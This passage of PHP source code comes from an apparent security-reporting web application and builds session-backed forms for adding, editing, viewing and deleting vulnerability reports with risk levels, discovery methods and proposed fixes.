                "textareas" => array () ,
                "files"     => array () ,
                "submit"    => array ( "id" => "submit" , "name" => "submit" , "value" => "submit" ) ,
                "reset"     => array ( "id" => "reset" , "name" => "reset" , "value" => "reset" ) ,
                "button"    => array (
                    "id"      => "add_new_form" ,
                    "name"    => "add_new_form" ,
                    "value"   => "Add a new vulnerability information form" ,
                    "display" => false ,
                    "events"  => array (
                        "onclick" => 'click_dyn_add_button(\'' . Class_Base_Format ::htmlentities ( $_form_id ) . '\',\'dyn_form_hidden_index_id\');' ,
                    ) ,
                ) ,
            );
            $_dyn_form    = array (
                "id"        => $_form_id ,
                "style"     => "display:none;" ,
                "hiddens"   => array () ,
                "selects"   => array (
                    array (
                        "id"      => "risk_level" ,
                        "title"   => "Risk Level : " ,
                        "name"    => "risk_level" ,
                        "options" => array (
                            array ( "describe" => "Mild danger" , "title" => "Mild danger" , "value" => 1 , "selected" => ( ( $_risk_level == 1 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Mild to moderate danger" , "title" => "Mild to moderate danger" , "value" => 2 , "selected" => ( ( $_risk_level == 2 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Moderate danger" , "title" => "Moderate danger" , "value" => 3 , "selected" => ( ( $_risk_level == 3 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Moderate to severe danger" , "title" => "Moderate to severe danger" , "value" => 4 , "selected" => ( ( $_risk_level == 4 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Severe danger" , "title" => "Severe danger" , "value" => 5 , "selected" => ( ( $_risk_level == 5 ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                    array (
                        "id"      => "discovery_method" ,
                        "title"   => "Discovery method : " ,
                        "name"    => "discovery_method" ,
                        "options" => array (
                            array ( "describe" => "Black box penetration test" , "title" => "Black box penetration test" , "value" => 1 , "selected" => ( ( $_discovery_method == 1 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "White box penetration test" , "title" => "White box penetration test" , "value" => 2 , "selected" => ( ( $_discovery_method == 2 ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                    array (
                        "id"      => "vulnerability_type" ,
                        "title"   => "Vulnerability type : " ,
                        "name"    => "vulnerability_type" ,
                        "options" => array (
                            array ( "describe" => "Network vulnerabilities" , "title" => "Network vulnerabilities" , "value" => 1 , "selected" => ( ( $_vulnerability_type == 1 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "System vulnerabilities" , "title" => "System vulnerabilities" , "value" => 2 , "selected" => ( ( $_vulnerability_type == 2 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Software vulnerabilities" , "title" => "Software vulnerabilities" , "value" => 3 , "selected" => ( ( $_vulnerability_type == 3 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Web Site vulnerabilities" , "title" => "Web Site vulnerabilities" , "value" => 4 , "selected" => ( ( $_vulnerability_type == 4 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "Other types of vulnerabilities" , "title" => "Other types of vulnerabilities" , "value" => 5 , "selected" => ( ( $_vulnerability_type == 5 ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "vulnerability_name" ,
                        "title"    => "Vulnerability Name : " ,
                        "describe" => "Vulnerability Name" ,
                        "name"     => "vulnerability_name" ,
                        "value"    => ( $_vulnerability_name ) ,
                    ) ,
                    array (
                        "id"       => "vulnerability_discovery_personnel" ,
                        "title"    => "Vulnerability Discovery Personnel : " ,
                        "describe" => "Vulnerability Discovery Personnel" ,
                        "name"     => "vulnerability_discovery_personnel" ,
                        "value"    => ( $_vulnerability_discovery_personnel ) ,
                    ) ,
                    array (
                        "id"       => "contact_information_of_vulnerability_discovery_personnel" ,
                        "title"    => "Contact information of vulnerability discovery personnel : " ,
                        "describe" => "Contact information of vulnerability discovery personnel" ,
                        "name"     => "contact_information_of_vulnerability_discovery_personnel" ,
                        "value"    => ( $_contact_information_of_vulnerability_discovery_personnel ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => 'vulnerability_impact' ,
                        "title" => "Vulnerability Impact : " ,
                        "name"  => "vulnerability_impact" ,
                        "value" => ( $_vulnerability_impact ) ,
                        "style" => 'height:200px;' ,
                    ) ,
                    array (
                        "id"    => 'vulnerability_discovery_process' ,
                        "title" => "Vulnerability Discovery Process : " ,
                        "name"  => "vulnerability_discovery_process" ,
                        "value" => ( $_vulnerability_discovery_process ) ,
                        "style" => 'height:300px;' ,
                    ) ,
                    array (
                        "id"    => 'solution_proposal' ,
                        "title" => "Solution_proposal : " ,
                        "name"  => "solution_proposal" ,
                        "value" => ( $_solution_proposal ) ,
                        "style" => 'height:400px;' ,
                    ) ,
                ) ,
                "files"     => array () ,
                "submit"    => array ( "name" => "submit" ) ,
                "reset"     => array ( "name" => "reset" ) ,
                "button"    => array ( "name" => "add_new_form" ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Report_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) . Class_View ::dyn_form_body ( $_dyn_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ click_dyn_add_button(\'' . Class_Base_Format ::htmlentities ( $_form_id ) . '\',\'dyn_form_hidden_index_id\'); } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function edit_vulnerability_report ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! isset( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
            $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
        }
        if ( ! is_array ( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
            $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
        }
        $_is_updated                = false;
        $_risk_level_limits         = array ( 1 , 2 , 3 , 4 , 5 , );
        $_discovery_method_limits   = array ( 1 , 2 , );
        $_vulnerability_type_limits = array ( 1 , 2 , 3 , 4 , 5 , );
        for ( $report_index = 0 ; $report_index < 50 ; $report_index ++ ) {
            $_risk_level                                               = Class_Base_Request ::form ( "risk_level_" . $report_index , Class_Base_Request::TYPE_INTEGER , 0 );
            $_discovery_method                                         = Class_Base_Request ::form ( "discovery_method_" . $report_index , Class_Base_Request::TYPE_INTEGER , 0 );
            $_vulnerability_type                                       = Class_Base_Request ::form ( "vulnerability_type_" . $report_index , Class_Base_Request::TYPE_INTEGER , 0 );
            $_vulnerability_name                                       = Class_Base_Request ::form ( "vulnerability_name_" . $report_index , Class_Base_Request::TYPE_STRING , "" );
            $_vulnerability_discovery_personnel                        = Class_Base_Request ::form ( "vulnerability_discovery_personnel_" . $report_index , Class_Base_Request::TYPE_STRING , "" );
            $_contact_information_of_vulnerability_discovery_personnel = Class_Base_Request ::form ( "contact_information_of_vulnerability_discovery_personnel_" . $report_index , Class_Base_Request::TYPE_STRING , "" );
            $_vulnerability_impact                                     = Class_Base_Request ::form ( "vulnerability_impact_" . $report_index , Class_Base_Request::TYPE_STRING , "" );
            $_vulnerability_discovery_process                          = Class_Base_Request ::form ( "vulnerability_discovery_process_" . $report_index , Class_Base_Request::TYPE_STRING , "" );
            $_solution_proposal                                        = Class_Base_Request ::form ( "solution_proposal_" . $report_index , Class_Base_Request::TYPE_STRING , "" );
            if ( ! isset( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
                $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
            }
            if ( ! is_array ( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
                $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
            }
            if ( ( in_array ( $_risk_level , $_risk_level_limits ) ) && ( in_array ( $_discovery_method , $_discovery_method_limits ) ) && ( in_array ( $_vulnerability_type , $_vulnerability_type_limits ) ) ) {
                $_vulnerability_name_length                                       = strlen ( $_vulnerability_name );
                $_vulnerability_discovery_personnel_length                        = strlen ( $_vulnerability_discovery_personnel );
                $_contact_information_of_vulnerability_discovery_personnel_length = strlen ( $_contact_information_of_vulnerability_discovery_personnel );
                if ( ( ( $_vulnerability_name_length > 0 ) && ( $_vulnerability_name_length <= 100 ) ) && ( ( $_vulnerability_discovery_personnel_length > 0 ) && ( $_vulnerability_discovery_personnel_length <= 100 ) ) && ( ( $_contact_information_of_vulnerability_discovery_personnel_length > 0 ) && ( $_contact_information_of_vulnerability_discovery_personnel_length <= 100 ) ) ) {
                    $_vulnerability_impact_length            = strlen ( $_vulnerability_impact );
                    $_vulnerability_discovery_process_length = strlen ( $_vulnerability_discovery_process );
                    $_solution_proposal_length               = strlen ( $_solution_proposal );
                    if ( ( ( $_vulnerability_impact_length > 0 ) && ( $_vulnerability_impact_length <= 10000 ) ) && ( ( $_vulnerability_discovery_process_length > 0 ) && ( $_vulnerability_discovery_process_length <= 10000 ) ) && ( ( $_solution_proposal_length > 0 ) && ( $_solution_proposal_length <= 10000 ) ) ) {
                        $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ] = array (
                            "risk_level"                                               => $_risk_level ,
                            "discovery_method"                                         => $_discovery_method ,
                            "vulnerability_type"                                       => $_vulnerability_type ,
                            "vulnerability_name"                                       => $_vulnerability_name ,
                            "vulnerability_discovery_personnel"                        => $_vulnerability_discovery_personnel ,
                            "contact_information_of_vulnerability_discovery_personnel" => $_contact_information_of_vulnerability_discovery_personnel ,
                            "vulnerability_impact"                                     => $_vulnerability_impact ,
                            "vulnerability_discovery_process"                          => $_vulnerability_discovery_process ,
                            "solution_proposal"                                        => $_solution_proposal ,
                        );
                        $_is_updated                                         = true;
                    }
                }
            }
        }
        if ( ( $_is_updated ) && ( ! empty( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) ) {
            Class_Base_Response ::redirect ( "/report/show_vulnerability_report" , array () );
            return null;
        }
        if ( ! is_cli () ) {
            if ( empty( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
                $_form_top = '<div style="margin-top:64px;text-align: left;font-size: 18px;"></div>';
                $_form_top .= '<div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;"></div>';
            } else {
                $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Edit Vulnerability Report</div>';
                $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to edit vulnerability reports, which include vulnerability names, vulnerability types, vulnerability risk levels, vulnerability discovery methods, vulnerability discovery processes, vulnerability impact levels, solution suggestions for vulnerabilities, vulnerability discoverers, and their contact information. By using this module function, you can easily edit vulnerability reports online.</div>';
            }
            $_form_id   = ( 'report_vulnerability_report_form_id' );
            $_form_html = '';
            $_forms     = array ();
            foreach ( $_SESSION[ "VULNERABILITY_REPORT" ] as $report_index => $item ) {
                $_forms[ $report_index ] = array (
                    "action"    => "/report/edit_vulnerability_report" ,
                    "id"        => ( $_form_id . "_" . $report_index ) ,
                    "name"      => "report_vulnerability_report_form_" . $report_index ,
                    "hiddens"   => array (
                        array (
                            "id"    => "roport_index_" . $report_index ,
                            "name"  => "report_index_" . $report_index ,
                            "value" => $report_index ,
                        ) ,
                    ) ,
                    "selects"   => array (
                        array (
                            "id"      => "risk_level_" . $report_index ,
                            "title"   => "Risk Level : " ,
                            "name"    => "risk_level_" . $report_index ,
                            "options" => array (
                                array ( "describe" => "Mild danger" , "title" => "Mild danger" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Mild to moderate danger" , "title" => "Mild to moderate danger" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 2 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Moderate danger" , "title" => "Moderate danger" , "value" => 3 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 3 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Moderate to severe danger" , "title" => "Moderate to severe danger" , "value" => 4 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 4 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Severe danger" , "title" => "Severe danger" , "value" => 5 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 5 ) ? "selected" : "" ) ) ,
                            ) ,
                        ) ,
                        array (
                            "id"      => "discovery_method_" . $report_index ,
                            "title"   => "Discovery method : " ,
                            "name"    => "discovery_method_" . $report_index ,
                            "options" => array (
                                array ( "describe" => "Black box penetration test" , "title" => "Black box penetration test" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "discovery_method" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "White box penetration test" , "title" => "White box penetration test" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "discovery_method" ] ) == 2 ) ? "selected" : "" ) ) ,
                            ) ,
                        ) ,
                        array (
                            "id"      => "vulnerability_type_" . $report_index ,
                            "title"   => "Vulnerability type : " ,
                            "name"    => "vulnerability_type_" . $report_index ,
                            "options" => array (
                                array ( "describe" => "Network vulnerabilities" , "title" => "Network vulnerabilities" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "System vulnerabilities" , "title" => "System vulnerabilities" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 2 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Software vulnerabilities" , "title" => "Software vulnerabilities" , "value" => 3 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 3 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Web Site vulnerabilities" , "title" => "Web Site vulnerabilities" , "value" => 4 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 4 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Other types of vulnerabilities" , "title" => "Other types of vulnerabilities" , "value" => 5 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 5 ) ? "selected" : "" ) ) ,
                            ) ,
                        ) ,
                    ) ,
                    "inputs"    => array (
                        array (
                            "id"       => "vulnerability_name_" . $report_index ,
                            "title"    => "Vulnerability Name : " ,
                            "describe" => "Vulnerability Name" ,
                            "name"     => "vulnerability_name_" . $report_index ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_name" ] ) ) ,
                        ) ,
                        array (
                            "id"       => "vulnerability_discovery_personnel_" . $report_index ,
                            "title"    => "Vulnerability Discovery Personnel : " ,
                            "describe" => "Vulnerability Discovery Personnel" ,
                            "name"     => "vulnerability_discovery_personnel_" . $report_index ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_discovery_personnel" ] ) ) ,
                        ) ,
                        array (
                            "id"       => "contact_information_of_vulnerability_discovery_personnel_" . $report_index ,
                            "title"    => "Contact information of vulnerability discovery personnel : " ,
                            "describe" => "Contact information of vulnerability discovery personnel" ,
                            "name"     => "contact_information_of_vulnerability_discovery_personnel_" . $report_index ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "contact_information_of_vulnerability_discovery_personnel" ] ) ) ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "id"    => 'vulnerability_impact_' . $report_index ,
                            "title" => "Vulnerability Impact : " ,
                            "name"  => "vulnerability_impact_" . $report_index ,
                            "value" => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_impact" ] ) ) ,
                            "style" => 'height:200px;' ,
                        ) ,
                        array (
                            "id"    => 'vulnerability_discovery_process_' . $report_index ,
                            "title" => "Vulnerability Discovery Process : " ,
                            "name"  => "vulnerability_discovery_process_" . $report_index ,
                            "value" => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_discovery_process" ] ) ) ,
                            "style" => 'height:300px;' ,
                        ) ,
                        array (
                            "id"    => 'solution_proposal_' . $report_index ,
                            "title" => "Solution_proposal : " ,
                            "name"  => "solution_proposal_" . $report_index ,
                            "value" => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "solution_proposal" ] ) ) ,
                            "style" => 'height:400px;' ,
                        ) ,
                    ) ,
                    "files"     => array () ,
                    "submit"    => array ( "id" => "submit_" . $report_index , "name" => "submit_" . $report_index , "value" => "submit" , "display" => true ) ,
                    "reset"     => array ( "id" => "reset_" . $report_index , "name" => "reset_" . $report_index , "value" => "reset" , "display" => true ) ,
                    "button"    => array (
                        "id"      => "show_report_" . $report_index ,
                        "name"    => "show_report_" . $report_index ,
                        "value"   => "show report" ,
                        "display" => true ,
                        "events"  => array (
                            "onclick" => ' document.location.href=\'' . Class_Base_Response ::get_url ( "/report/show_vulnerability_report" , array () ) . '\'; ' ,
                        ) ,
                    ) ,
                );
                $_form_html              .= Class_View ::form_body ( $_forms[ $report_index ] );
            }
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Report_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . ( $_form_html ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ console.log("init"); } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_SESSION[ "VULNERABILITY_REPORT" ] );
        }
        return null;
    }

    public static function show_vulnerability_report ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! isset( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
            $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
        }
        if ( ! is_array ( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
            $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
        }
        if ( ! is_cli () ) {
            if ( empty( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
                $_form_top = '<div style="margin-top:64px;text-align: left;font-size: 18px;"></div>';
                $_form_top .= '<div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;"></div>';
            } else {
                $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Show Vulnerability Report</div>';
                $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module is used to display vulnerability reports, which include vulnerability names, types, risk levels, discovery methods, discovery processes, impact levels, suggested solutions for vulnerabilities, and contact information for vulnerability discoverers. By using this module function, you can easily view vulnerability reports online.</div>';
            }
            $_form_id   = ( 'report_vulnerability_report_form_id' );
            $_form_html = '';
            $_forms     = array ();
            foreach ( $_SESSION[ "VULNERABILITY_REPORT" ] as $report_index => $item ) {
                $_forms[ $report_index ] = array (
                    "action"    => "/report/edit_vulnerability_report" ,
                    "id"        => ( $_form_id . "_" . $report_index ) ,
                    "name"      => "report_vulnerability_report_form" ,
                    "hiddens"   => array () ,
                    "selects"   => array (
                        array (
                            "id"       => "risk_level" ,
                            "title"    => "Risk Level : " ,
                            "name"     => "risk_level" ,
                            "options"  => array (
                                array ( "describe" => "Mild danger" , "title" => "Mild danger" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Mild to moderate danger" , "title" => "Mild to moderate danger" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 2 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Moderate danger" , "title" => "Moderate danger" , "value" => 3 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 3 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Moderate to severe danger" , "title" => "Moderate to severe danger" , "value" => 4 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 4 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Severe danger" , "title" => "Severe danger" , "value" => 5 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "risk_level" ] ) == 5 ) ? "selected" : "" ) ) ,
                            ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "discovery_method" ,
                            "title"    => "Discovery method : " ,
                            "name"     => "discovery_method" ,
                            "options"  => array (
                                array ( "describe" => "Black box penetration test" , "title" => "Black box penetration test" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "discovery_method" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "White box penetration test" , "title" => "White box penetration test" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "discovery_method" ] ) == 2 ) ? "selected" : "" ) ) ,
                            ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "vulnerability_type" ,
                            "title"    => "Vulnerability type : " ,
                            "name"     => "vulnerability_type" ,
                            "options"  => array (
                                array ( "describe" => "Network vulnerabilities" , "title" => "Network vulnerabilities" , "value" => 1 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 1 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "System vulnerabilities" , "title" => "System vulnerabilities" , "value" => 2 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 2 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Software vulnerabilities" , "title" => "Software vulnerabilities" , "value" => 3 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 3 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Web Site vulnerabilities" , "title" => "Web Site vulnerabilities" , "value" => 4 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 4 ) ? "selected" : "" ) ) ,
                                array ( "describe" => "Other types of vulnerabilities" , "title" => "Other types of vulnerabilities" , "value" => 5 , "selected" => ( ( intval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_type" ] ) == 5 ) ? "selected" : "" ) ) ,
                            ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "inputs"    => array (
                        array (
                            "id"       => "vulnerability_name" ,
                            "title"    => "Vulnerability Name : " ,
                            "describe" => "Vulnerability Name" ,
                            "name"     => "vulnerability_name" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_name" ] ) ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "vulnerability_discovery_personnel" ,
                            "title"    => "Vulnerability Discovery Personnel : " ,
                            "describe" => "Vulnerability Discovery Personnel" ,
                            "name"     => "vulnerability_discovery_personnel" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_discovery_personnel" ] ) ) ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => "contact_information_of_vulnerability_discovery_personnel" ,
                            "title"    => "Contact information of vulnerability discovery personnel : " ,
                            "describe" => "Contact information of vulnerability discovery personnel" ,
                            "name"     => "contact_information_of_vulnerability_discovery_personnel" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "contact_information_of_vulnerability_discovery_personnel" ] ) ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "id"       => 'vulnerability_impact' ,
                            "title"    => "Vulnerability Impact : " ,
                            "name"     => "vulnerability_impact" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_impact" ] ) ) ,
                            "style"    => 'height:200px;' ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => 'vulnerability_discovery_process' ,
                            "title"    => "Vulnerability Discovery Process : " ,
                            "name"     => "vulnerability_discovery_process" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "vulnerability_discovery_process" ] ) ) ,
                            "style"    => 'height:300px;' ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "id"       => 'solution_proposal' ,
                            "title"    => "Solution_proposal : " ,
                            "name"     => "solution_proposal" ,
                            "value"    => ( strval ( $_SESSION[ "VULNERABILITY_REPORT" ][ $report_index ][ "solution_proposal" ] ) ) ,
                            "style"    => 'height:400px;' ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "files"     => array () ,
                    "submit"    => array ( "id" => "submit" , "name" => "submit" , "value" => " edit report " , "display" => true ) ,
                    "reset"     => array ( "id" => "reset" , "name" => "reset" , "value" => "reset" , "display" => false ) ,
                    "button"    => array (
                        "id"      => "delete" ,
                        "name"    => "delete" ,
                        "value"   => " delete report entry " ,
                        "display" => true ,
                        "events"  => array (
                            "onclick" => ' document.location.href=\'' . Class_Base_Response ::get_url ( "/report/delete_vulnerability_report" , array () ) . '\'; ' ,
                        ) ,
                    ) ,
                );
                $_form_html              .= Class_View ::form_body ( $_forms[ $report_index ] );
            }
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Report_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . ( $_form_html ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ console.log("init"); } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_SESSION[ "VULNERABILITY_REPORT" ] );
        }
        return null;
    }

    public static function delete_vulnerability_report ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! isset( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
            $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
        }
        if ( ! is_array ( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
            $_SESSION[ "VULNERABILITY_REPORT" ] = array ();
        }
        for ( $report_index = 0 ; $report_index < 100 ; $report_index ++ ) {
            $_report_index = Class_Base_Request ::form ( "report_index_" . $report_index , Class_Base_Request::TYPE_INTEGER , - 1 );
            if ( $_report_index >= 0 ) {
                $_SESSION[ "VULNERABILITY_REPORT" ][ $_report_index ] = null;
                unset( $_SESSION[ "VULNERABILITY_REPORT" ][ $_report_index ] );
            }
        }
        if ( ! is_cli () ) {
            if ( empty( $_SESSION[ "VULNERABILITY_REPORT" ] ) ) {
                $_form_top = '<div style="margin-top:64px;text-align: left;font-size: 18px;"></div>';
                $_form_top .= '<div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;"></div>';
            } else {
                $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Delete Vulnerability Report</div>';
                $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">The current interface is the confirmation stage before officially deleting the vulnerability report. Please confirm that the report content to be deleted is what you really want to delete! After clicking the delete button, the report content will be officially cleared and cannot be restored!</div>';
            }
